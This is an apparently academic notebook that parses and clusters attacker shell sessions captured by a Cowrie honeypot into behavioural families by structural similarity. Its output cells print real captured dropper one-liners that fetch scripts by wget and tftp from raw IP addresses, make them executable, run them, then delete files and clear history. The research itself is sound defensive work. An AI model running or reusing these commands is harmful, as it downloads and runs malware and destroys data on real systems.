# %% [markdown]
# # Functional Similarity (FS): End-to-End Pipeline
#
# This notebook shows the full FS pipeline for a single dataset (here: `Cowrie.csv`),
# **building on top of the FI results**.
#
# The steps are:
#
# 1. Set up the project root and import the `fi_fs` module.
# 2. Run the FI bootstrap (or load the FI table) to obtain FI-unique archetypes.
# 3. Build a mapping from `fi_hash → canonical sequence` for these archetypes.
# 4. Compute pairwise FS scores between archetypes using a structural
#    Levenshtein-style comparator.
# 5. Save the FS matrix for reuse (e.g. clustering, evaluation).
# 6. Cluster archetypes into FS-based families and inspect their summaries
#    (sizes, medoids, consensus structure).
#
# The goal is to make it easy to see **what FS does** from start to finish,
# given FI-unique archetypes as input.

# %%
# Bootstrap project root + Python path
import sys, subprocess
from pathlib import Path
import json
import numpy as np
import pandas as pd

import fi_fs

ROOT = Path(subprocess.check_output(
    ["git", "rev-parse", "--show-toplevel"],
    text=True,
).strip())

sys.path[:0] = [str(ROOT / "src")]
print("ROOT project:", ROOT.name)

# FI pipeline pieces

from fi_fs import (
    # FI core
    load_aggregated_csv,
    parse_dataframe_to_triplets,
    apply_aliases,
    apply_placeholders_args_only,
    assert_connectors_preserved,
    alpha_renumber,
    assert_serialisation_deterministic,
    build_fi_dataframe,
    load_alias_map_yaml,

    # FS core
    build_archetypes,
    fs_levenshtein_structural,
    agglomerative_from_fs,
    evaluate_fs_clustering,
    group_indices_from_labels,
    medoid_indices,

    # FS families + visuals
    parse_structured_tokens,
    sankey_from_family_enhanced,

    # Utils (colouring)
    build_fi_colour_map,
    colour_text,
)
# Out:
# PYTHON: cpython 3.12.0
# BASHLEX: 0.18
# ROOT project: PhD

# %% [markdown]
# ## Step 1 - FI bootstrap for FS (parse → normalise → FI table)
#
# FS works **on top of** the FI-unique archetypes, so we first (re)run the FI
# pipeline for the chosen dataset:
#
# 1. **Load aggregated sessions** from `projects/fi_fs/data/processed/<dataset>.csv`.
# 2. **Parse** each session’s command string with `bashlex` into ordered
#    `(op, args, conn)` triplets.
# 3. **Normalise** the sequences:
#    - apply the alias map (canonical operators),
#    - replace literals with typed placeholders,
#    - α-renumber placeholders for deterministic naming.
# 4. **Build the FI table**, adding a canonical JSON representation and
#    an `fi_hash` (class ID) for each session.
#
# The resulting `fi_df` dataframe is the starting point for FS: it tells us how
# many sessions there are in total and how many **FI-unique** behavioural
# archetypes we will compare with FS.

# %%
# FI bootstrap for FS: parse → normalise → FI table

DATASET = "Cowrie.csv"
INPUT = ROOT / "projects" / "fi_fs" / "data" / "processed" / DATASET

agg, stats = load_aggregated_csv(str(INPUT))
print(f"\n--- FI bootstrap for FS ---")
print(f"Dataset: {INPUT.relative_to(ROOT)}")
print(f"Aggregated sessions: {stats['n_sessions']}")

# 1) bashlex → triplets
seqs, parsed_parts, parse_df, problems = parse_dataframe_to_triplets(
    agg,
    progress=True,
    with_diagnostics=True,
    strict=False,
)
print(f"Parsed sequences: {len(seqs)}")

# 1b) restrict agg to successfully parsed sessions only
parsed_sids = set(seqs.keys())
agg_ok = agg[agg["session"].isin(parsed_sids)].copy()

print("\n--- Filter parsed sessions ---")
print("Original agg sessions:   ", len(agg))
print("Sessions with sequences:", len(agg_ok))

# Optional safety checks
missing_from_seqs = set(agg_ok["session"]) - parsed_sids
missing_from_agg  = parsed_sids - set(agg_ok["session"])
assert not missing_from_seqs, f"In agg_ok but not seqs: {list(missing_from_seqs)[:5]}"
assert not missing_from_agg,  f"In seqs but not agg_ok: {list(missing_from_agg)[:5]}"

# 2) normalisation: aliases → placeholders → α-renumber
alias_map_path = ROOT / "src" / "fi_fs" / "resources" / "alias_map.yaml"
alias_map = load_alias_map_yaml(alias_map_path)
seqs_alias, alias_changes = apply_aliases(seqs, alias_map)
print("Alias changes:", 0 if alias_changes is None else len(alias_changes))

seqs_ph, dbg = apply_placeholders_args_only(
    seqs_alias,
    debug=True,
    preview_changed_first_n_sessions=5,
    sample_per_reason=5,
)
assert_connectors_preserved(seqs_alias, seqs_ph)
seqs_alpha = alpha_renumber(seqs_ph, check_idempotent=True)
print("α-renumbered sessions:", len(seqs_alpha))

# 3) FI table
assert_serialisation_deterministic(seqs_alpha)
fi_df = build_fi_dataframe(agg_ok, seqs_alpha, commands_col="commands_joined")
print(f"Sessions total (parsed only): {len(fi_df)} | FI-unique: {fi_df['fi_hash'].nunique()}")

fi_df.head(5)
# Out:
# --- FI bootstrap for FS ---
# Dataset: projects/fi_fs/data/processed/Cowrie.csv
# Aggregated sessions: 98513
# Parsing sessions (bashlex): 100%|██████████| 98513/98513 [01:08<00:00, 1430.78it/s]
# Parsed sequences: 98425
#
# --- Filter parsed sessions ---
# Original agg sessions:    98513
# Sessions with sequences: 98425
# Alias changes: 488
# α-renumbered sessions: 98425
# Sessions total (parsed only): 98425 | FI-unique: 607
#         session  n_rows           fi_hash  \
# 0  00031aeff1a6       5  9c07a2ac9b0db760
# 1  0003e7887230       5  9c07a2ac9b0db760
# 2  0003f10a2103       4  ec2785b8610be5a7
# 3  0004025aa9c2      15  5e1318289a0eede4
# 4  000537a9f749       1  c1f4de5103d6ebc1
#
#                                       commands_clean  \
# 0  sh\nshell\nenable\necho 'nameserver 95.214.27....
# 1  sh\nshell\nenable\necho 'nameserver 95.214.27....
# 2  sh\nshell\nenable\ncat /bin/echo || while read...
# 3  sh\nshell\nenable\ncd ~ && rm -rf .ssh && mkdi...
# 4                               uname -s -v -n -r -m
#
#                                       canonical_json
# 0  [["sh",[],";"],["shell",[],";"],["enable",[],"...
# 1  [["sh",[],";"],["shell",[],";"],["enable",[],"...
# 2  [["sh",[],";"],["shell",[],";"],["enable",[],"...
# 3  [["sh",[],";"],["shell",[],";"],["enable",[],"...
# 4       [["uname",["-s","-v","-n","-r","-m"],"EOS"]]

# %% [markdown]
# ## Step 2 - Build `fi_hash → canonical sequence` map for FS
#
# Next, we construct a mapping from each **FI class** to its canonical
# execution sequence:
#
# - `build_archetypes(fi_df)` groups sessions by `fi_hash`,
# - selects the canonical sequence for each FI class, and
# - returns a dictionary: `fi_hash → [(op, args, conn), ...]`.
#
# This `arche_map` is the input to FS: it tells us *which* behaviour each
# FI-unique archetype represents, in a form that the FS comparator can work on.

# %%
# Cell 3 - build fi_hash -> triplets map for FS

# Map fi_hash -> triplets (canonical sequences)
arche_map = build_archetypes(fi_df)
print("FI-unique archetypes (by fi_hash):", len(arche_map))
# Out:
# FI-unique archetypes (by fi_hash): 607

# %% [markdown]
# ## Step 3 - Compute and save the FS matrix (structural Levenshtein)
#
# Using the FI-unique archetypes (`arche_map`), we now:
#
# 1. **Compute pairwise FS scores** with a structural Levenshtein-style
#    comparator:
#    - operates on canonical `(op, args, conn)` triplets,
#    - is order-aware and can optionally include connectors in the comparison.
#
# 2. **Inspect basic sanity stats** (mean/median/min/max of off-diagonal FS
#    values) to check the spread of similarities.
#
# 3. **Save the FS matrix** to disk as:
#
#    `projects/fi_fs/data/output/<dataset_name>/FS_eval/<dataset_name>_FS_Lev_opconn_N{N}.npy`
#
#    where `N` is the number of FI-unique archetypes.
#    This `.npy` file can then be reused by clustering/evaluation notebooks
#    without recomputing FS.

# %%
from pathlib import Path as _Path

N = len(arche_map)
print(f"Computing structural Levenshtein FS over N={N} FI-unique archetypes...")

labels_lev, FS_lev = fs_levenshtein_structural(
    arche_map,
    include_connectors=True,
    progress=True,
)

# Sanity stats (off-diagonal only)
tri = FS_lev[np.triu_indices_from(FS_lev, 1)]
print(
    f"FS (off-diagonal): n={tri.size}, "
    f"mean={tri.mean():.3f}, median={np.median(tri):.3f}, "
    f"min={tri.min():.3f}, max={tri.max():.3f}"
)

# Output path: data/output/<dataset_name>/FS_eval/<dataset_name>_FS_Lev_opconn_N{N}.npy
DATASET_NAME = _Path(DATASET).stem
fs_dir = ROOT / "projects" / "fi_fs" / "data" / "output" / DATASET_NAME / "FS_eval" / "NumPy_Arrays"
fs_dir.mkdir(parents=True, exist_ok=True)

fs_filename = f"{DATASET_NAME}_FS_Lev_opconn_N{FS_lev.shape[0]}.npy"
fs_path = fs_dir / fs_filename
np.save(fs_path, FS_lev)

print("Saved FS array to:", fs_path.relative_to(ROOT))
# Out:
# Computing structural Levenshtein FS over N=607 FI-unique archetypes...
# Levenshtein-struct (rows):   0%|          | 0/607 [00:00<?, ?it/s]
# Levenshtein-struct (pairs):   0%|          | 0/183921 [00:00<?, ?it/s]
# FS (off-diagonal): n=183921, mean=0.185, median=0.139, min=0.002, max=1.000
# Saved FS array to: projects/fi_fs/data/output/Cowrie/FS_eval/NumPy_Arrays/Cowrie_FS_Lev_opconn_N607.npy

# %% [markdown]
# ## Step 4 - Align archetypes to FS matrix order
#
# The FS matrix `FS_lev` is indexed in the order returned by the FS
# comparator (`labels_lev`, a list of `fi_hash` values).
#
# To make later analysis easier, we:
#
# 1. Rebuild the FI-unique representatives (one row per `fi_hash`), choosing
#    the longest `n_rows` per class as before.
# 2. **Reindex** this table using `labels_lev` so that rows line up exactly
#    with the rows/columns of `FS_lev`.
# 3. Decode `canonical_json` into explicit `(op, args, conn)` sequences and
#    store them in a `seq` column.
#
# The resulting `archetypes` dataframe (plus `seqs_unique` and `fi_hashes`)
# is now perfectly aligned to the FS matrix and ready for clustering and
# family-level analysis.

# %%
# Align FI-unique archetypes to FS_lev order (labels_lev)

def decode_canonical(canon_json: str):
    rows = json.loads(canon_json)
    return [(op, tuple(args), conn) for op, args, conn in rows]


# Build FI-unique representatives as before, then reindex by labels_lev
archetypes = (
    fi_df.sort_values(["n_rows", "session"], ascending=[False, True])
         .drop_duplicates("fi_hash", keep="first")
         .set_index("fi_hash")
         .loc[labels_lev]                     # align rows to FS_lev order
         .reset_index()                       # fi_hash back as a column
         [["fi_hash", "session", "n_rows", "canonical_json"]]
)

archetypes["seq"] = archetypes["canonical_json"].map(decode_canonical)

# Convenience globals in FS_lev row order
seqs_unique = archetypes["seq"].tolist()
fi_hashes   = archetypes["fi_hash"].tolist()

print(f"Aligned archetypes to FS matrix order. Rows: {len(archetypes)}")
display(archetypes.head(5))
# Out:
# Aligned archetypes to FS matrix order. Rows: 607
#             fi_hash       session  n_rows  \
# 0  0014c5294a1b8182  b898ce35a477       5
# 1  0129d0d0e783bb89  60a7ef53c929       1
# 2  015931310783b74b  88f6d0afbaf6       9
# 3  02038519ce400bdc  13166095803e       6
# 4  021cda85adade07c  1474808cc7d5       1
#
#                                       canonical_json  \
# 0  [["curl",["PH_URL_1"],"|"],["sudo",["python3",...
# 1  [["cd",["PH_PATH_1"],";"],["wget",["PH_URL_1"]...
# 2  [["free",[],";"],["lscpu",[],";"],["top",[],";...
# 3  [["linuxshell",[],";"],["sh",[],";"],["enable"...
# 4  [["rm",["-rf","PH_PATH_1"],";"],["wget",["PH_U...
#
#                                                  seq
# 0  [(curl, (PH_URL_1,), |), (sudo, (python3, -, -...
# 1  [(cd, (PH_PATH_1,), ;), (wget, (PH_URL_1,), ;)...
# 2  [(free, (), ;), (lscpu, (), ;), (top, (), ;), ...
# 3  [(linuxshell, (), ;), (sh, (), ;), (enable, ()...
# 4  [(rm, (-rf, PH_PATH_1), ;), (wget, (PH_URL_1, ...

# %% [markdown]
# ## Step 5 - Cluster archetypes into FS families (Agglomerative)
#
# With the FS matrix `FS_lev` in hand, we now cluster the FI-unique
# archetypes into **FS families** using Agglomerative clustering:
#
# - The threshold `tau` controls how similar items must be to join a family.
# - `agglomerative_from_fs` returns a cluster label per archetype.
# - `evaluate_fs_clustering` reports basic summary stats (number of families,
#   singletons, etc.).
#
# The resulting labels are stored in `archetypes["family_agg"]` and will be
# used for family-level summaries and visualisations.

# %%
# Cluster FS matrix into families (Agglomerative @ tau)

# FS threshold pre-set from FS_Eval notebook experiments
# Adjust accordingly if needed
TAU = 0.75

labels_agg = agglomerative_from_fs(FS_lev, tau=TAU)
archetypes["family_agg"] = labels_agg

stats = evaluate_fs_clustering(
    FS_lev,
    labels_agg,
    tau=TAU,
)

print(f"FS Agglomerative clustering @ tau={TAU}")
print("Families discovered:", stats["n_clusters"])
print("Singleton families:", stats["n_singletons"])

print("\nFamily size distribution (top 10):")
display(pd.Series(labels_agg).value_counts().head(10))

print("\nInternal metrics:")
display(pd.DataFrame([stats]))
# Out:
# FS Agglomerative clustering @ tau=0.75
# Families discovered: 298
# Singleton families: 204
#
# Family size distribution (top 10):
# 45     49
# 69     22
# 3      14
# 2      13
# 44     12
# 1      11
# 73     10
# 8      10
# 136     9
# 61      8
# Name: count, dtype: int64
# Internal metrics:
#   config   tau    N  n_clusters  n_singletons  max_cluster_size  \
# 0         0.75  607         298           204                49
#
#    median_cluster_size  cohesion_min_FS  cohesion_mean_FS  silhouette  \
# 0                  1.0         0.633333          0.961235    0.454071
#
#    calinski_harabasz  davies_bouldin     dunn
# 0         150.145207        0.412721  0.30303

# %%
# Optional: explicit groups + medoids from cluster labels

groups = group_indices_from_labels(labels_agg)
medoids = medoid_indices(FS_lev, groups)

print(f"Clusters: {len(groups)}")
print("Example cluster → members (first 5 clusters):")
for gid in sorted(groups.keys())[:5]:
    print(f"  Cluster {gid}: indices {groups[gid][:10]}{' ...' if len(groups[gid]) > 10 else ''}")

print("\nMedoid indices per cluster (first 5):")
for gid in sorted(medoids.keys())[:5]:
    print(f"  Cluster {gid}: medoid index {medoids[gid]}")
# Out:
# Clusters: 298
# Example cluster → members (first 5 clusters):
#   Cluster 0: indices [415, 456, 520]
#   Cluster 1: indices [35, 48, 55, 57, 122, 274, 299, 317, 410, 469] ...
#   Cluster 2: indices [39, 41, 147, 168, 246, 321, 324, 372, 397, 455] ...
#   Cluster 3: indices [19, 37, 124, 180, 231, 252, 288, 338, 381, 417] ...
#   Cluster 4: indices [83, 198, 509]
#
# Medoid indices per cluster (first 5):
#   Cluster 0: medoid index 520
#   Cluster 1: medoid index 35
#   Cluster 2: medoid index 321
#   Cluster 3: medoid index 37
#   Cluster 4: medoid index 83

# %% [markdown]
# ## Step 6 - Summarise FS families and members
#
# With cluster labels assigned (`labels_agg`), we now build:
#
# 1. **Family-level summaries** via `summarise_families`:
#    - one row per FS family,
#    - size and basic FS statistics (mean / sd),
#    - the medoid index and its `fi_hash`,
#    - simple descriptive features such as `top_ops` and
#      `consensus_skeleton_pairs`.
#
# 2. A **family members table** via `build_family_members_df`:
#    - one row per FI-unique archetype,
#    - includes its `family_id`, `fi_hash`, and basic metadata.
#
# These two tables (`summ_df` and `family_members_df`) support downstream
# inspection, reporting, and visualisation of FS-based behavioural families.

# %%
# Summarise FS families and build member table

from fi_fs.fs_families import summarise_families, build_family_members_df

# Sanity checks (optional but nice when running standalone)
for name in ["archetypes", "seqs_unique", "FS_lev", "labels_agg"]:
    if name not in globals():
        raise RuntimeError(f"Expected '{name}' to be defined before this cell.")

fi_hashes = archetypes["fi_hash"].tolist()  # aligned with FS_lev rows

# 1) Per-family summaries
summ_df, family_groups, medoids = summarise_families(
    FS=FS_lev,
    seqs_unique=seqs_unique,
    labels=labels_agg,
    fi_hashes=fi_hashes,
)

cols = [
    "family_id",
    "size",
    "mean_FS",
    "sd_FS",
    "medoid_idx",
    "medoid_fi_hash",
    "top_ops",
    "consensus_skeleton_pairs",
]

n_singletons = int((summ_df["size"] == 1).sum())
print(f"\nFamilies total: {len(summ_df)} | Singleton families: {n_singletons}")
print("\nFamily summaries (top 10 by size, then mean_FS):")
display(summ_df[cols].head(10))

# 2) Family members table (one row per archetype with its family label)
family_members_df = build_family_members_df(
    archetypes=archetypes,
    labels=labels_agg,
)

print(
    f"\nfamily_members_df: {len(family_members_df)} rows across "
    f"{family_members_df['family_id'].nunique()} families"
)
display(family_members_df.head(5))
# Out:
# Families total: 298 | Singleton families: 204
#
# Family summaries (top 10 by size, then mean_FS):
#    family_id  size  mean_FS   sd_FS  medoid_idx    medoid_fi_hash  \
# 0         45    49   1.0000  0.0000          16  0575fce921790578
# 1         69    22   1.0000  0.0000          50  153fd69fc12292c2
# 2          3    14   0.9202  0.0819          37  0e2f33f329730941
# 3          2    13   0.7998  0.0834         321  8e6a4487862fa88a
# 4         44    12   0.9186  0.0370          40  0fbbb73a992a1549
# 5          1    11   0.8149  0.0908          35  0ca225e81884a110
# 6         73    10   0.9492  0.0346          73  1dcdd0685e28acdb
# 7          8    10   0.8545  0.0809         106  2b5150c23e9a475b
# 8        136     9   0.9655  0.0278          58  16584cd6f1989339
# 9         61     8   0.9152  0.0751          54  15c5aa567680fe3f
#
#                                              top_ops  \
# 0                                    [(busybox, 49)]
# 1                                       [(echo, 22)]
# 2  [(cd, 70), (sh, 57), (chmod, 42), (rm, 29), (t...
# 3  [(ps, 22), (grep, 22), (cat, 21), (echo, 13), ...
# 4  [(cp, 297), (chmod, 209), (cd, 122), (rm, 111)...
# 5  [(cd, 49), (sh, 32), (chmod, 31), (tftp, 20), ...
# 6  [(rm, 35), (tftp, 20), (enable, 10), (system, ...
# 7  [(cd, 50), (cat, 18), (chmod, 14), (wget, 10),...
# 8  [(echo, 575), (rm, 63), (chmod, 27), (tftp, 18...
# 9  [(chmod, 8), (PH_EXEC_1, 8), (wget, 7), (cd, 6...
#
#                             consensus_skeleton_pairs
# 0                                   [(busybox, EOS)]
# 1                                      [(echo, EOS)]
# 2  [(cd, ||), (cd, ||), (cd, ||), (cd, ||), (cd, ...
# 3        [(ps, |), (grep, ;), (echo, |), (cat, EOS)]
# 4  [(cd, &&), (rm, &&), (mkdir, &&), (echo, &&), ...
# 5  [(cd, ||), (cd, ||), (cd, ;), (wget, ;), (chmo...
# 6  [(enable, ;), (system, ;), (shell, ;), (sh, ;)...
# 7  [(cd, ||), (cd, ||), (cd, ||), (cd, ||), (cd, ...
# 8  [(enable, ;), (system, ;), (shell, ;), (sh, ;)...
# 9                     [(chmod, ;), (PH_EXEC_1, EOS)]
# family_members_df: 607 rows across 298 families
#    family_id  archetype_idx           fi_hash       session  n_rows  \
# 0        222              0  0014c5294a1b8182  b898ce35a477       5
# 1         16              1  0129d0d0e783bb89  60a7ef53c929       1
# 2        168              2  015931310783b74b  88f6d0afbaf6       9
# 3         79              3  02038519ce400bdc  13166095803e       6
# 4         56              4  021cda85adade07c  1474808cc7d5       1
#
#                                        struct_tokens
# 0  [["curl",["PH_URL_1"],"|"],["sudo",["python3",...
# 1  [["cd",["PH_PATH_1"],";"],["wget",["PH_URL_1"]...
# 2  [["free",[],";"],["lscpu",[],";"],["top",[],";...
# 3  [["linuxshell",[],";"],["sh",[],";"],["enable"...
# 4  [["rm",["-rf","PH_PATH_1"],";"],["wget",["PH_U...

# %% [markdown]
# ## Step 7 - Export an FS families Markdown report
#
# To make the FS results easy to browse outside the notebook, we generate a
# Markdown report with one section per FS family:
#
# - Families are ordered by **size** (largest first), then by **mean_FS**.
# - For each family we record:
#   - the family ID,
#   - size, mean_FS, and sd_FS,
#   - the medoid archetype (`fi_hash`, session id, `n_rows`),
#   - the consensus `(op, conn)` skeleton,
#   - the top operators observed in the family.
#
# We also list up to the first 12 member archetypes (with `fi_hash`,
# `session`, and `n_rows`) for a quick textual overview.
#
# The report is written to:
#
# `projects/fi_fs/data/processed/<dataset_name>_FS_families_report.md`
#
# and can be opened directly in any Markdown viewer or included as an
# appendix in documentation.

# %%
# Create a Markdown report with one section per family

from pathlib import Path as _Path

# Detect a commands column on fi_df for medoid snippet lookups
CMD_COL_CANDIDATES = ["commands_clean", "commands_joined", "commands"]
cmd_col = next((c for c in CMD_COL_CANDIDATES if c in fi_df.columns), None)
if cmd_col is None:
    raise KeyError(
        f"No commands column found in fi_df. "
        f"Looked for: {CMD_COL_CANDIDATES}. "
        f"Got: {list(fi_df.columns)}"
    )

lines = ["# FS Families Report\n"]
fam_order = (
    summ_df.sort_values(["size", "mean_FS"], ascending=[False, False])["family_id"]
           .tolist()
)

for fid in fam_order:
    row = summ_df.loc[summ_df["family_id"] == fid].iloc[0]
    idxs = family_groups[fid]
    medoid_idx = int(row["medoid_idx"])
    med = archetypes.iloc[medoid_idx]

    # Medoid look-up from fi_df (original FI table)
    med_sess = str(med.session)
    med_hash = med.fi_hash
    med_rows = fi_df.loc[
        (fi_df["session"].astype(str) == med_sess) &
        (fi_df["fi_hash"] == med_hash),
        cmd_col,
    ]

    if not med_rows.empty:
        med_cmds = str(med_rows.iloc[0])
        max_len = 260
        if len(med_cmds) > max_len:
            med_cmds_snippet = med_cmds[:max_len] + " ..."
        else:
            med_cmds_snippet = med_cmds
    else:
        med_cmds_snippet = "(commands not found in fi_df)"

    lines.append(
        f"## Family {fid}\n\n"
        f"Size: **{row['size']}**, mean_FS: **{row['mean_FS']:.3f}**, "
        f"sd_FS: **{row['sd_FS']:.3f}**  \n"
        f"Medoid: `fi_hash={med.fi_hash}` "
        f"(session `{med.session}`, n_rows={int(med.n_rows)})  \n\n"
        f"**Medoid commands (snippet):**\n\n"
        f"```bash\n{med_cmds_snippet}\n```\n\n"
        f"Consensus (op, conn) pairs:\n\n"
        f"```python\n{row['consensus_skeleton_pairs']}\n```\n\n"
        f"Top operators: {row['top_ops']}\n"
    )

    # Members as a proper Markdown table instead of a code block
    members = (
        archetypes.loc[idxs, ["fi_hash", "session", "n_rows"]]
        .head(5)
        .reset_index(drop=True)
    )
    members_md = members.to_markdown(index=False)

    lines.append("**Members (first 5):**\n\n" + members_md + "\n")

md_text = "\n".join(lines)

DATASET_NAME = _Path(DATASET).stem
report_dir = ROOT / "projects" / "fi_fs" / "data" / "output" / DATASET_NAME / "FS_eval"
report_dir.mkdir(parents=True, exist_ok=True)

report_path = report_dir / f"{DATASET_NAME}_FS_families_report.md"
with open(report_path, "w", encoding="utf-8") as f:
    f.write(md_text)

print("Wrote FS families report to:", report_path.relative_to(ROOT))
# Out:
# Wrote FS families report to: projects/fi_fs/data/output/Cowrie/FS_eval/Cowrie_FS_families_report.md

# %% [markdown]
# ## Step 8 - Sankey visualisation for a chosen FS family
#
# To get an intuitive view of **how** commands vary within a single FS family,
# we can draw a Sankey diagram for one `family_id`:
#
# 1. Select a family (`FAM`) and collect its `struct_tokens` from
#    `family_members_df`.
# 2. Decode these into structured sequences for all member archetypes.
# 3. Use `sankey_from_family_enhanced` to build a flow diagram where:
#    - the backbone path reflects a consensus sequence (WLCS backbone),
#    - branches represent common variants at different positions,
#    - edge widths indicate how often each variant occurs.
#
# The printed `variant_detail` data gives a textual breakdown of the same
# information (variants per “gap”), complementing the visualisation.

# %%
# Sankey visualisation for a chosen FS family

import json
from pprint import pprint

FAM = 1

# 1) Pull family members' structured tokens
rows = family_members_df.loc[
    family_members_df["family_id"] == FAM,
    "struct_tokens",
]
if rows.empty:
    avail = sorted(family_members_df["family_id"].unique().tolist())
    raise ValueError(
        f"No members for family {FAM}. "
        f"Available family_ids (first 20): {avail[:20]}"
    )

family_seqs = [parse_structured_tokens(json.loads(s)) for s in rows]

# 2) Metadata for caption from summaries + archetypes
meta_row = summ_df.loc[summ_df["family_id"] == FAM].iloc[0]
medoid_idx = int(meta_row["medoid_idx"])
med = archetypes.iloc[medoid_idx]

caption = {
    "family_id": FAM,
    "n_sessions": len(family_seqs),
    "mean_FS": meta_row["mean_FS"],
    "sd_FS": meta_row["sd_FS"],
    "medoid_fi_hash": med["fi_hash"],
    "medoid_session": med["session"],
    "medoid_n_rows": int(med["n_rows"]),
    "top_ops": meta_row["top_ops"],
}

# 3) Build and show Sankey
fig, backbone, stats = sankey_from_family_enhanced(
    family_seqs,
    backbone=None,  # use WLCS backbone
    title=f"Family {FAM} — Sankey (WLCS backbone, structural FS)",
    min_variant_support=0.10,
    topN_variants_per_gap=3,
    variant_label_mode="first",
    normalise_widths=False,
    caption=caption,
)
fig.show()

print("Variant details by gap (k=0 is START→B0):")
pprint(stats["variant_detail"])
# Out:
# Variant details by gap (k=0 is START→B0):
# {0: {'uname ;': 2}, 3: {'curl ;': 1}, 8: {'rm ;': 2, 'tftp ;': 9}}

# %% [markdown]
# ## Step 9 - Inspect original sessions for a chosen FS family
#
# FS families are defined over **FI-unique archetypes**, but each archetype
# (`fi_hash`) can correspond to many original sessions. This cell lets us
# “open up” one FS family and see all of its underlying sessions.
#
# For a chosen `family_id` (`FAM`):
#
# 1. **Select FI classes in the family**
#    Use `archetypes["family_agg"]` to find all `fi_hash` values that belong
#    to the chosen FS family.
#
# 2. **Expand back to original sessions**
#    Filter `fi_df` (one row per original session) to keep only those whose
#    `fi_hash` is in that family. Detect a suitable commands column
#    (`commands_clean`, `commands_joined`, or `commands`), and sort sessions
#    by `fi_hash`, then `n_rows`, then `session`.
#
# 3. **Colour-map FI classes**
#    Build a stable mapping `fi_hash → colour` with `build_fi_colour_map`,
#    and print a small legend showing how many sessions each FI class
#    contributes.
#
# 4. **Pretty-print sessions grouped by FI class**
#    For each FI class in the family, print:
#    - a group header (`FI class <fi_hash> — N sessions`), and
#    - each session’s `commands_clean`, colour-coded by `fi_hash`.
#
# This makes it much easier to see, within a single FS family, which concrete
# scripts belong to which FI-unique archetype, and how many times each
# archetype appears in the raw data.

# %%
# Inspect commands for all original sessions in a given FS family

FAM = 1

# 1) FI classes (fi_hash) that belong to this FS family
if "family_agg" not in archetypes.columns:
    raise KeyError(
        "Expected 'family_agg' column on archetypes. "
        "Run the clustering cell before this one."
    )

fam_fi_hashes = (
    archetypes.loc[archetypes["family_agg"] == FAM, "fi_hash"]
    .astype(str)
    .unique()
    .tolist()
)
if not fam_fi_hashes:
    raise ValueError(f"No FI classes found for family {FAM} in 'family_agg'.")

# 2) Expand back to all original sessions via fi_df
subset = fi_df[fi_df["fi_hash"].astype(str).isin(fam_fi_hashes)].copy()

cmd_col = next(
    (c for c in ["commands_clean", "commands_joined", "commands"] if c in subset.columns),
    None,
)
if cmd_col is None:
    raise KeyError(
        "No commands column found in fi_df. "
        "Looked for: commands_clean / commands_joined / commands."
    )

subset = (
    subset.assign(session=lambda df: df["session"].astype(str))
          .loc[:, ["session", "n_rows", "fi_hash", cmd_col]]
          .rename(columns={cmd_col: "commands_clean"})
          .sort_values(["fi_hash", "n_rows", "session"], ascending=[True, False, True])
          .reset_index(drop=True)
)

n_sessions = len(subset)
unique_fi = subset["fi_hash"].unique().tolist()
fi_counts = subset["fi_hash"].value_counts().sort_index()

print(f"Family {FAM}: {n_sessions} original sessions")
print(f"Distinct FI classes in this family: {len(unique_fi)}")

# 3) Colour map and legend
fi_to_colour = build_fi_colour_map(unique_fi, seed=1)

print("\nFI-class legend (colour-coded):")
for fh in sorted(unique_fi):
    label = f"{fh} (sessions={fi_counts[fh]})"
    print("  ", colour_text(label, fh, fi_to_colour))

# 4) Detailed per-session printout
print("\n=== Per-session commands_clean (grouped by fi_hash) ===")
current_fi = None

for _, row in subset.iterrows():
    fh = row["fi_hash"]
    if fh != current_fi:
        current_fi = fh
        header = f"\n### FI class {fh} — {fi_counts[fh]} sessions"
        print(colour_text(header, fh, fi_to_colour))

    hdr = f"--- session {row['session']} | n_rows={row['n_rows']} | fi_hash={fh} ---"
    print(colour_text(hdr, fh, fi_to_colour))

    cmds = str(row["commands_clean"])
    pretty = cmds if "\n" in cmds else cmds.replace(" ; ", ";\n")
    print(colour_text(pretty, fh, fi_to_colour))
# Out:
# Family 1: 328 original sessions
# Distinct FI classes in this family: 11
#
# FI-class legend (colour-coded):
#    0ca225e81884a110 (sessions=1)
#    13d8841f330b058a (sessions=10)
#    160f60200a5f9040 (sessions=169)
#    16579c36795501c1 (sessions=9)
#    32e217eef22aa399 (sessions=1)
#    767bcaa5b923c155 (sessions=56)
#    82865ab70d22907f (sessions=1)
#    8c936a7f9bae58cc (sessions=33)
#    b1791777be4c8ea5 (sessions=10)
#    cd5c93af44ede945 (sessions=11)
#    f7f98db3d5ed5589 (sessions=27)
#
# === Per-session commands_clean (grouped by fi_hash) ===
#
# ### FI class 0ca225e81884a110 — 1 sessions
# --- session 42e843ce4995 | n_rows=1 | fi_hash=0ca225e81884a110 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.151.156.242/skid.sh; chmod 777 skid.sh; sh skid.sh; tftp 192.151.156.242 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 192.151.156.242; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *; history -c
#
# ### FI class 13d8841f330b058a — 10 sessions
# --- session 4210ea9d0a7f | n_rows=1 | fi_hash=13d8841f330b058a ---
# cd /tmp || cd /run || cd /; wget http://3.90.219.71/Dynabins.sh; chmod 777 Dynabins.sh; sh Dynabins.sh; tftp 3.90.219.71 -c get Dynatftp1.sh; chmod 777 Dynatftp1.sh; sh Dynatftp1.sh; tftp -r Dynatftp2.sh -g 3.90.219.71; chmod 777 Dynatftp2.sh; sh Dynatftp2.sh; rm -rf Dynabins.sh Dynatftp1.sh Dynatftp2.sh; rm -fr *
# --- session 58fbef4de99c | n_rows=1 | fi_hash=13d8841f330b058a ---
# cd /tmp || cd /run || cd /; wget http://3.90.219.71/Dynabins.sh; chmod 777 Dynabins.sh; sh Dynabins.sh; tftp 3.90.219.71 -c get Dynatftp1.sh; chmod 777 Dynatftp1.sh; sh Dynatftp1.sh; tftp -r Dynatftp2.sh -g 3.90.219.71; chmod 777 Dynatftp2.sh; sh Dynatftp2.sh; rm -rf Dynabins.sh Dynatftp1.sh Dynatftp2.sh; rm -fr *
# --- session 6c3669c2baff | n_rows=1 | fi_hash=13d8841f330b058a ---
